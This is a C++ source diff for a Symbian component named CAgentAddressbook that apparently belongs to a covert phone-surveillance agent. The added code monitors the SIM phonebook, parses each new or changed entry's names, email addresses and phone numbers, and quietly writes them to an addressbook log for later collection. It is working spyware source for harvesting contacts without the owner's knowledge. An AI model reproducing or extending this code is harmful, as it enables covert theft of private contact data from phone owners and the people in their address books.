@@ -84,6 +84,13 @@ CAgentAddressbook::CAgentAddressbook() :
 
 CAgentAddressbook::~CAgentAddressbook()
 	{
+	#ifndef __SERIES60_3X__  //look for SIM contacts only in Symbian3
+	delete iPhoneStoreMonitor;
+	iBookStore.Close();
+	iPhone.Close();
+	iTelServer.Close();
+	#endif
+	
 	__FLOG(_L("Destructor"));
 	delete iLongTask;
 	delete iDbNotifier;
@@ -117,6 +124,16 @@ void CAgentAddressbook::ConstructL(const TDesC8& params)
 	__FLOG(_L("-------------"));
 	iLongTask = CLongTaskAO::NewL(*this);
 	iMarkupFile = CLogFile::NewL(iFs);
+	
+	#ifndef __SERIES60_3X__  //look for SIM contacts only in Symbian3
+	iTelServer.Connect();
+	RTelServer::TPhoneInfo info;
+	iTelServer.GetPhoneInfo(0, info);
+	iPhone.Open(iTelServer, info.iName);
+	iBookStore.Open(iPhone, _L("S7"));
+	iPhoneStoreMonitor = CPhoneStoreMonitor::NewL(iBookStore,*this); 
+	//iPhoneStoreMonitor->Listen();
+	#endif
 	}
 
 void CAgentAddressbook::StartAgentCmdL()
@@ -160,7 +177,7 @@ void CAgentAddressbook::StartAgentCmdL()
 	// Control the time range to filter on
 	iFilter->SetFilterDateTime(iTimestamp);
 	// Specify the type of contact item to include
-	iFilter->SetContactFilterTypeALL(EFalse);
+	iFilter->SetContactFilterTypeALL(EFalse);  
 	iFilter->SetContactFilterTypeCard(ETrue);
 	iFilter->SetContactFilterTypeGroup(EFalse);
 	iFilter->SetContactFilterTypeOwnCard(EFalse);
@@ -176,11 +193,15 @@ void CAgentAddressbook::StartAgentCmdL()
 	
 	iContactIndex = 0;
 	
+	iPhoneStoreMonitor->Listen(); //TODO: move at the end of start dump when done with testing
+	
 	iLongTask->NextRound();
 	}
 
 void CAgentAddressbook::StopAgentCmdL()
 	{
+	iPhoneStoreMonitor->Cancel(); //TODO: see if it's fine here
+	
 	__FLOG(_L("StopAgentCmdL()"));
 	delete iDbNotifier;
 	iDbNotifier = NULL;
@@ -242,6 +263,135 @@ HBufC* CAgentAddressbook::ReadFieldAsTextL(const CContactItemField& itemField)
 			return HBufC::NewL(0);
 		}
 	}
+
+//code inspiration: mm_pbutil.cpp, phone book record format is TLV (tag-length-value)
+#ifndef __SERIES60_3X__
+HBufC8* CAgentAddressbook::GetSimContactBufferL(const TDesC8& aRecordBuf)
+	{
+	CBufBase* buffer = CBufFlat::NewL(50);
+	CleanupStack::PushL(buffer);
+	
+	TUint8 uniqueId;
+	const TUint8 KTagPadZeroValue = 0x00;
+	TPtrC8 read(aRecordBuf);
+	TInt length=read.Length();
+	while (length > 0)
+		{
+		// Extract all padding zero bytes until tag is found
+		TInt i=0;
+		TUint8 tagValue;
+		do
+			{
+			tagValue=read[i++];
+			} while ((tagValue==KTagPadZeroValue) && i<length);
+		// examine tag
+		if (i < length)
+			{
+			read.Set(read.Mid(i));
+			length = read.Length();
+			TUint16 size=0;
+			switch(tagValue) 
+				{
+				case RMobilePhoneBookStore::ETagPBNewEntry:
+				case RMobilePhoneBookStore::ETagPBAnrStart:
+					//aDataType = EPhBkTypeNoData;
+					break;
+				case RMobilePhoneBookStore::ETagPBDateTime:
+					{
+					//aDataType = EPhBkTypeInt8;
+					read.Set(read.Mid(1));  //skipped
+					}
+					break;
+				case RMobilePhoneBookStore::ETagPBBearerCap:
+				case RMobilePhoneBookStore::ETagPBEntryControl:
+				case RMobilePhoneBookStore::ETagPBHiddenInfo:
+				case RMobilePhoneBookStore::ETagPBTonNpi:
+				case RMobilePhoneBookStore::ETagPBEntryStatus:
+					//aDataType = EPhBkTypeInt8;
+					{
+					read.Set(read.Mid(1));  //skipped
+					}
+					break;
+				case RMobilePhoneBookStore::ETagPBUniqueId:
+					//aDataType = EPhBkTypeInt8;
+					{
+					uniqueId=(TUint8)(read[0]);
+					read.Set(read.Mid(1));
+					}
+					break;					
+				case RMobilePhoneBookStore::ETagPBAdnIndex: 
+					//aDataType = EPhBkTypeInt16; 
+					{
+					read.Set(read.Mid(2)); //skipped
+					}
+					break;
+				case RMobilePhoneBookStore::ETagPBSecondName:
+					//aDataType = EPhBkTypeDes16;
+					{
+					TContactEntry intType = ELastName;
+					TUint16 size=(TUint16)((read[1]<<8)+read[0]);		
+					TUint16 len=(TUint16)(size/2);
+					read.Set(read.Mid(2));
+															
+					TUint32 typeAndLen = intType << 24;
+					typeAndLen += size;
+					buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+					buffer->InsertL(buffer->Size(), (TUint8*)read.Ptr(), size);
+					read.Set(read.Mid(size));
+					}
+					break;
+				case RMobilePhoneBookStore::ETagPBGroupName:
+				case RMobilePhoneBookStore::ETagPBEmailAddress:
+				case RMobilePhoneBookStore::ETagPBText:
+					//aDataType = EPhBkTypeDes16;
+					{
+					TContactEntry intType = EFirstName;
+					TUint16 size=(TUint16)((read[1]<<8)+read[0]);		
+					TUint16 len=(TUint16)(size/2);
+					read.Set(read.Mid(2));
+										
+					TUint32 typeAndLen = intType << 24;
+					typeAndLen += size;
+					buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+					buffer->InsertL(buffer->Size(), (TUint8*)read.Ptr(), size);
+					read.Set(read.Mid(size));
+					}
+					break;
+				case RMobilePhoneBookStore::ETagPBNumber:
+						//aDataType = EPhBkTypeDes16; 
+					{
+					//phone number
+					TContactEntry intType = EMobileTelephoneNumber;
+					TUint16 size=(TUint16)((read[1]<<8)+read[0]);		
+					TUint16 len=(TUint16)(size/2);
+					read.Set(read.Mid(2)); 
+					
+					TUint32 typeAndLen = intType << 24;
+					typeAndLen += size;
+					buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+					buffer->InsertL(buffer->Size(), (TUint8*)read.Ptr(), size);
+					read.Set(read.Mid(size));
+					}
+					break;
+				default:
+					break;
+				}
+				length = read.Length();
+			}
+		}
+	
+	// adds header data to buffer
+	THeader header;
+	header.dwVersion = KVersionAddressbook; 
+	header.dwSize += buffer->Size();
+	header.lOid = uniqueId;
+	buffer->InsertL(0, &header, sizeof(header)); 
+
+	HBufC8* result = buffer->Ptr(0).AllocL();
+	CleanupStack::PopAndDestroy(buffer);
+	return result;
+	}
+#endif
 
 HBufC8* CAgentAddressbook::GetContactBufferL(const CContactItem& item)
 	{
@@ -522,6 +672,58 @@ HBufC8* CAgentAddressbook::GetTTimeBufferL(const TTime aTime)
 	return result;
 }
 
+
+#ifndef __SERIES60_3X__
+void CAgentAddressbook::PhoneStoreEventL(TUint32 aEvent, TInt aIndex)
+	{
+	switch(aEvent)
+		{
+		case RMobilePhoneStore::KStoreEntryAdded:
+		case RMobilePhoneStore::KStoreEntryChanged:
+		//case RMobilePhoneStore::KStoreEntryDeleted:
+			{
+			RMobilePhoneBookStore::TMobilePhoneBookInfoV1 storeInfo;
+			RMobilePhoneBookStore::TMobilePhoneBookInfoV1Pckg storeInfoPckg(storeInfo);
+				
+			TRequestStatus status;
+			iBookStore.GetInfo(status, storeInfoPckg);
+			User::WaitForRequest(status);
+			if ( status.Int() != KErrNone ) 
+				{
+				return;
+				}
+			HBufC8* entry = HBufC8::NewL(1024);
+			TPtr8 buf = entry->Des();
+			iBookStore.Read(status, aIndex, 1, buf);
+			User::WaitForRequest(status);
+			if (status.Int() == KErrNone)
+				{
+				RBuf8 buf(GetSimContactBufferL(*entry));
+				buf.CleanupClosePushL();
+				if (buf.Length() > 0)
+					{
+					TInt value;
+					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+					if(value)
+						{
+						CLogFile* logFile = CLogFile::NewLC(iFs);
+						logFile->CreateLogL(LOGTYPE_ADDRESSBOOK);
+						logFile->AppendLogL(buf);
+						logFile->CloseLogL();
+						CleanupStack::PopAndDestroy(logFile);
+						}
+					}
+				CleanupStack::PopAndDestroy(&buf);
+				}
+			delete entry;
+			}
+			break;
+		default:
+			// nothing to do, we aren't interested in other events
+			break;
+		}
+	}
+#endif
 
 /*
  AddressBook Agent
